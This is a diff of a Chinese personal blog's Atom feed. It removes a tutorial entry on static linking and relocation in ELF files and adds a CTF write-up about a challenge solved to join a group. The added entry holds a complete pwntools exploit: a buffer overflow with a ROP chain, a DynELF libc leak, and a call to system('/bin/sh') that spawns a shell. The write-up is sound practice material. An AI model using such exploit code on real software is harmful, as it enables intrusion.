@@ -120,24 +120,6 @@
   </entry>
   
   <entry>
-    <title>静态编译linux的ELF文件</title>
-    <link href="http://yoursite.com/2018/03/08/re_elf_static/"/>
-    <id>http://yoursite.com/2018/03/08/re_elf_static/</id>
-    <published>2018-03-08T01:51:03.295Z</published>
-    <updated>2018-03-08T03:57:22.645Z</updated>
-    
-    <content type="html"><![CDATA[<p>程序员自我修养第4章——静态编译<br><a id="more"></a></p><h1 id="1、什么是静态编译"><a href="#1、什么是静态编译" class="headerlink" title="1、什么是静态编译"></a>1、什么是静态编译</h1><p>静态编译，就是编译器在编译可执行文件的时候，将可执行文件需要调用的对应动态链接库(.so或.lib)中的部分提取出来，链接到可执行文件中去，使可执行文件在运行的时候不依赖于动态链接库。</p><h1 id="2、实验"><a href="#2、实验" class="headerlink" title="2、实验"></a>2、实验</h1><p>这里有a.c,b.c两个文件，如下:<br>b.c<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> shared=<span class="number">1</span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span> *a,<span class="keyword">int</span> *b)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">*a^=*b^=*a^=*b;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>a.c<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">extern</span> <span class="keyword">int</span> shared;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> a=<span class="number">100</span>;</div><div class="line">swap(&amp;a,&amp;shared);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>通过编译<code>gcc -c a.c b.c</code>产生a.o,b.o两个目标文件，接着我们准备把a.o,b.o文件合并ab文件。这里有两种方法。</p><h2 id="一种是按序叠加-直接将一个文件加在另一个文件的尾，并依此合并-。"><a href="#一种是按序叠加-直接将一个文件加在另一个文件的尾，并依此合并-。" class="headerlink" title="一种是按序叠加(直接将一个文件加在另一个文件的尾，并依此合并)。"></a>一种是<code>按序叠加</code>(直接将一个文件加在另一个文件的尾，并依此合并)。</h2><h2 id="一种是相似段合并-将相同性质的段合并到一起，如text段合并到text段-，又称为两步链接法。"><a href="#一种是相似段合并-将相同性质的段合并到一起，如text段合并到text段-，又称为两步链接法。" class="headerlink" title="一种是相似段合并(将相同性质的段合并到一起，如text段合并到text段)，又称为两步链接法。"></a>一种是<code>相似段合并</code>(将相同性质的段合并到一起，如text段合并到text段)，又称为<code>两步链接法</code>。</h2><p>这里我们采用第二种方法进行链接(链接器为目标文件分配地址和空间)</p><h3 id="第一步-空间与地址分配"><a href="#第一步-空间与地址分配" class="headerlink" title="第一步 空间与地址分配"></a>第一步 空间与地址分配</h3><p>扫描所有的输入文件，获取他们的各个段的长度，属性和位置，并且将输入目标文件的符号表中所有的符号定义和符号引用收集起来，同意放到一个全局符号表，并建立映射关系。</p><h3 id="第二步-符号解析与重定位"><a href="#第二步-符号解析与重定位" class="headerlink" title="第二步 符号解析与重定位"></a>第二步 符号解析与重定位</h3><p>使用上面收集的所有信息，读取输入文件中断的数据，重定位信息，并且进行符号解析与重定位，调整代码中的地址等。这一步中核心是重定位过程。<br>我们使用ld链接器将<code>a.o</code>和<code>b.o</code>链接起来。<br><code>ld a.o b.o -e main -o ab</code><br>-e main 表示将main函数作为程序的入口地址，ld链接器默认的程序入口地址是_start.<br>-o ab 表示链接输出文件名为ab，默认为a.out<br><img src="https://i.imgur.com/CcjDrqB.png" alt=""><br><img src="https://i.imgur.com/VBcjd4b.png" alt=""><br>上图中VMA(Vitual Meemory Address)虚拟地址，LMA(load Memory Address)加载地址，正常情况下这两个是一样的，但是在一些嵌入式系统中，特别是在哪些程序放在ROM的系统中，它们是不同的。</p><h3 id="符号地址的确定"><a href="#符号地址的确定" class="headerlink" title="符号地址的确定"></a>符号地址的确定</h3><p>当完成前面一步时，链接器开始计算各个符号的虚拟地址，因为各个符号在段内的相对位置是固定的，所有这个时候<code>main</code>,<code>shared</code>的地址已经确认啦(只需要每一个符号加上一个偏移，就能找到正确的虚拟地址)。</p><h3 id="符号解析和重定位"><a href="#符号解析和重定位" class="headerlink" title="符号解析和重定位"></a>符号解析和重定位</h3><h4 id="重定位"><a href="#重定位" class="headerlink" title="重定位"></a>重定位</h4><p>我们用<code>objdump -d a.o</code><br><img src="https://i.imgur.com/b7qqXAH.png" alt=""><br>可以看到shared的地址是0，因为这里不知道的位置。swap也是一样的。我们再看看ab<br><code>objdunp -d ab</code><br><img src="https://i.imgur.com/gIQHS6j.png" alt=""><br>发现链接后能正确的找到符号地址</p><h4 id="重定位修正方法"><a href="#重定位修正方法" class="headerlink" title="重定位修正方法"></a>重定位修正方法</h4><p>对于Intel x86处理器，有两种类型的处理器，分布的修正方法<br>A = 保存在修正位置的值<br>S = 符号的实际地址<br>P = 被修正过的位置(相对于段开始的偏移量或是虚拟地址)</p><p>1、R_386_32 绝对寻址修正 S+A<br>2、R_386_PC32 相对寻址修正 S+A-P</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;程序员自我修养第4章——静态编译&lt;br&gt;
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
     <title>数据恢复</title>
     <link href="http://yoursite.com/2018/03/07/data_recovery/"/>
     <id>http://yoursite.com/2018/03/07/data_recovery/</id>
@@ -365,6 +347,24 @@
     <summary type="html">
     
       &lt;p&gt;去膜拜看雪师傅啦&lt;br&gt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>PWN为了入群做题</title>
+    <link href="http://yoursite.com/2017/11/03/pwn_ruqun/"/>
+    <id>http://yoursite.com/2017/11/03/pwn_ruqun/</id>
+    <published>2017-11-03T07:11:56.346Z</published>
+    <updated>2017-11-09T11:41:20.593Z</updated>
+    
+    <content type="html"><![CDATA[<p>想学习，必要了解各位师傅，必入群<br><a id="more"></a></p><h2 id="1、入群"><a href="#1、入群" class="headerlink" title="1、入群"></a>1、入群</h2><p>链接：<a href="http://pan.baidu.com/s/1qY4wyoW" target="_blank" rel="external">http://pan.baidu.com/s/1qY4wyoW</a> 密码：46d4<br>代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">elf=ELF(&apos;pwn&apos;)</div><div class="line">get_got = elf.got[&apos;fgets&apos;]</div><div class="line">puts_plt = elf.plt[&apos;puts&apos;]</div><div class="line">puts_got = elf.got[&apos;puts&apos;]</div><div class="line">main = elf.symbols[&apos;main&apos;]</div><div class="line"></div><div class="line">bss = 0x6020b0</div><div class="line">ppprdi=0x401ab0</div><div class="line">        </div><div class="line">p = process(&apos;pwn&apos;)</div><div class="line">p.recvuntil(&apos;&gt; &apos;)</div><div class="line">#gdb.attach(p,&apos;&apos;&apos;b *0x4019ea &apos;&apos;&apos;)</div><div class="line"></div><div class="line">def peek(addr):</div><div class="line">    rop = p64(ppprdi) +p64(addr) +p64(1)+p64(1) + p64(puts_plt) + p64(main)</div><div class="line">    p.sendline(&apos;A&apos;*40+ rop)</div><div class="line">    str = p.recvuntil(&apos;&gt; &apos;)</div><div class="line">    result = str.split(&apos;\ncallme&apos;)[0]</div><div class="line">    if result == &apos;&apos;:</div><div class="line">        return &apos;\x00&apos;</div><div class="line">    return result</div><div class="line"></div><div class="line">d = DynELF(peek, elf=elf)</div><div class="line">system = int(d.lookup(&apos;system&apos;, &apos;libc&apos;))</div><div class="line">gets = int(d.lookup(&apos;gets&apos;, &apos;libc&apos;))</div><div class="line"></div><div class="line"></div><div class="line">rop = p64(ppprdi) + p64(bss) +p64(1)+p64(1) + p64(gets) + p64(main)</div><div class="line">payload = &quot;A&quot;*40 + rop</div><div class="line">p.sendline(payload)</div><div class="line">p.sendline(&apos;/bin/sh\0&apos;)</div><div class="line">p.recvuntil(&apos;&gt; &apos;)</div><div class="line"></div><div class="line">rop=p64(ppprdi) + p64(bss) +p64(1)+p64(1) + p64(system) + p64(0xdeadbeef)</div><div class="line">payload = &quot;A&quot;*40+ rop</div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p><p>之后是什么、、、、说好的flag呢？<br>哇还有东西，居然还有都行，居然是.dat文件</p><p>害怕-恐怖</p><p>才想到做题技术大牛说的，不要害怕新的挑战，敢于尝试，</p><p>然后，研究几分钟，发现就很简单算法</p><h2 id="这时想去昨天技术大牛说的话，可能并不难，只是有颗害怕的心"><a href="#这时想去昨天技术大牛说的话，可能并不难，只是有颗害怕的心" class="headerlink" title="这时想去昨天技术大牛说的话，可能并不难，只是有颗害怕的心"></a>这时想去昨天技术大牛说的话，可能并不难，只是有颗害怕的心</h2><p>Do_more_and_ask_less</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;想学习，必要了解各位师傅，必入群&lt;br&gt;
     
     </summary>
     
